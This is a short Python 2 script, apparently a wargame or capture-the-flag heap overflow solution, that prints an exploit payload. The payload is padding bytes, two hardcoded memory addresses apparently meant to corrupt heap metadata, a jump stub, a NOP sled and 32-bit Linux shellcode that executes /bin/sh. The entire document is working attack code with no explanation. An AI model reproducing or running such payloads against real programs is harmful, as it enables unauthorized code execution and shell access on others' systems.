from struct import pack

takeoff = "\x6a\x0b\xeb\x06"
offset  = "\x90" * 8
shellcode   = "\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"


prev_a_addr = pack("<I", 0x080f3780)
prev_b_addr = pack("<I", 0xbffeb8ac)

print "\x69"*32 + " " + "\x69"*40 + prev_a_addr + prev_b_addr + " " + takeoff + offset + shellcode

